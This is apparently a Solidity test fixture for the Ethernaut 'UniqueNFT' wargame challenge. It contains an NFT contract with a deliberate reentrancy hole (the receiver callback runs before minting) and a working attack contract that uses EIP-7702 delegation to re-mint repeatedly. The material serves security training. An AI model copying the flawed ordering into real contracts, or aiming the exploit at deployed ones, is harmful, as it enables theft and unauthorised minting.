// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {ERC721Utils} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Utils.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// Local training fixture (Ethernaut 2025 UniqueNFT). The exploit relies on
// EIP-7702: the player EOA is given contract code (via vm.etch) whose
// onERC721Received reenters mintNFTEOA. Because checkOnERC721Received runs
// BEFORE _mint, balanceOf(player) is still 0 during the callback, so the
// reentrant mint succeeds and mints another token each round.
contract UniqueNFT is ERC721, ReentrancyGuard {
    uint256 public tokenId;

    constructor() ERC721("UniqueNFT", "UNFT") {}

    function mintNFTSmartContract() external payable nonReentrant returns (uint256 mintedNFT) {
        require(msg.value == 1 ether, "fee not sent");
        mintedNFT = _mintNFT();
    }

    function mintNFTEOA() external returns (uint256 mintedNFT) {
        require(tx.origin == msg.sender, "not an EOA");
        mintedNFT = _mintNFT();
    }

    function _mintNFT() private returns (uint256) {
        require(balanceOf(msg.sender) == 0, "only one unique NFT allowed");
        uint256 _tokenId = tokenId++;
        ERC721Utils.checkOnERC721Received(address(0), address(0), msg.sender, _tokenId, "");
        _mint(msg.sender, _tokenId);
        return _tokenId;
    }

    function _update(address to, uint256 _tokenId, address auth) internal override returns (address) {
        address from = super._update(to, _tokenId, auth);
        require(from == address(0), "transfers not allowed");
        return from;
    }
}

// EIP-7702 delegate target: its onERC721Received reenters mintNFTEOA on the
// caller (UniqueNFT). Runs in the player's address context, so msg.sender
// inside the reentrant call is the player EOA (tx.origin == msg.sender holds).
contract UniqueNFTAttack {
    uint256 public depth;

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (depth < 3) {
            depth++;
            UniqueNFT(msg.sender).mintNFTEOA();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

